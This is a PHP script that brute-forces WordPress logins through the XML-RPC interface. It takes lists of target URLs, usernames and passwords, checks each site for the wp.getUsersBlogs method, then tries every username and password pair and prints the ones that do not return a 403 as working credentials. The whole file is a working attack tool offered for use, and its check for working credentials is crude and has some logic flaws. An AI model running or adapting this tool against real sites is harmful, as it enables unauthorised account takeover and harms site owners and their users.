<?php

use Cvar1984\BruteForce;

require __DIR__ . '/vendor/autoload.php';

$fields =
    '<?xml version="1.0" encoding="utf-8"?> 
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>';

$brute = new BruteForce\Tools();
$endpoints = $brute->fileToArray($argv[1]);
$passwordLists = $brute->fileToArray($argv[2]);
$usernames = $brute->fileToArray($argv[3]);
$passwordListCount = count($passwordLists);

foreach ($endpoints as $endpoint) {
    foreach ($usernames as $username) {
        $username = htmlspecialchars($username, ENT_XML1, 'UTF-8'); // format xml
        $brute->requestXml($endpoint, $fields);
        $result = $brute->getRequestResult();
        
        if (!$result) {
            continue; // target seems to be not vulnerable
        }

        if (!$brute->searchArray('wp.getUsersBlogs', $result)) {
            return false; // target seems to be not vulnerable
        }

        for ($x = 0; $x < $passwordListCount; $x++) {
            $password = htmlspecialchars($passwordLists[$x], ENT_XML1, 'UTF-8'); // format xml
            echo '[testing] url: ', $endpoint, ' username: ', $username, ' password: ' . $password, "\n";
            
            $fields = sprintf(
                '<?xml version="1.0" encoding="UTF-8"?>
                <methodCall>
                    <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>%s</value></param>
                            <param><value>%s</value></param>
                        </params>
                </methodCall>',
                $username,
                $password
            );
            $brute->requestXml($endpoint, $fields);
            $result = $brute->getRequestResult();
            
            if (!$brute->searchArray('403', $result)) {
                echo '[vuln] url: ', $endpoint, ' username: ', $username, ' password: ', $password, "\n";
            }
        }
    }
}
